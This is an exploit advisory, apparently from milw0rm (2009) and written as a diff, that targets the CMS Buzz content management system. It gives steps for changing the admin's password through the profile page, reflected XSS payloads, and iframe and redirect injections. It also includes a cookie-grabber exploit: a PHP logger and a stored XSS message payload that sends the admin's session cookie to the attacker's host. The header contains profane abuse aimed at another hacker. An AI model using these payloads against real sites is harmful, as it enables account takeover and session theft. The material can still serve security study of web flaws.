@@ -1,0 +1,67 @@
+#################################################################################################################
+[+] CMS Buzz (xss/Change Password)Multiple Remote Vulnerabilities
+[+] Discovered By ThE g0bL!N
+[+] Vendor:cmsbuzz.com
+[+] Note : If you are The S3r!0uS  I say To Fuck you Because You are Hacked  Site Of My Best Friends dz-boys.com
+[+] Demo:http://demo.cmsbuzz.com/
+[+] Greeting : All my freinds ( Dz )
+#################################################################################################################
+Remote Changing Password:
++++++++++++++++++++++++++
+1) You Must Register In ThE site http://www.victim.com/?action=register
+2) Login
+3) Go To url:
+    http:///www.victim.com/?action=profile&user= [ Name Of user ]
+Example
+http:///www.victim.com/?action=profile&user=admin
+Change admin Password Then go To login http://path/?action=login
+Cross Site Scritping
+++++++++++++++++++++
+http://www.victim.com/?action=search
+<script>alert("xss")</script>
+
+#################################################################################################################
+[+] CMS Buzz Cookie Grabber Exploit& HTML Injection
+[+] Discovered By ThE g0bL!N
+[+] Vendor:http://msbuzz.com/
+[+] Fuck You The S3r!0uS
+#################################################################################################################
+PoC
+--
+[+] Make 2 files and upload to your host :
+[+]cookie.php  - > Put in this File That Code:
+ <?php
+ $cookie = $_GET['cookie'];
+ $log = fopen("log.txt", "a");
+ fwrite($log, $cookie ."\n");
+ fclose($log);
+ ?>
+[+]log.txt   - > CHMOD it 777 and put in the same directory with cookie.php
+ 
+[+]Exploit:
+   -------
+1) Register in The SIte
+2) Go to send message http://path/?action=compose
+3)We Put in
+  To:admin name
+  Subject: Some Subject
+  Message: <script>document.location ="http://localhost/[path]/cookie.php?cookie=" + document.cookie;</script>
+  The js code Worked When The admin Read The Message
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+2) HTML Injection
++++++++++++++++++
+1) Register :p
+2) Go to send message http://path/?action=compose
+3)We Put in
+  To:admin name
+  Subject: Some Subject
+  Message: 1)XSS:PoC :<script>alert("xss")</script>
+             ---------
+           2)Poc: Iframe :"><iframe src=http://www.google.com/></iframe>
+       -------------
+     3)PoC : Redirection:">"">>>><meta http-equiv="Refresh" content="0;url=http://www.google.com/"> ""
+     -------------------
+     DEMO:http://demo.cmsbuzz.com
+################################################################################################################
+
+# milw0rm.com [2009-06-18]
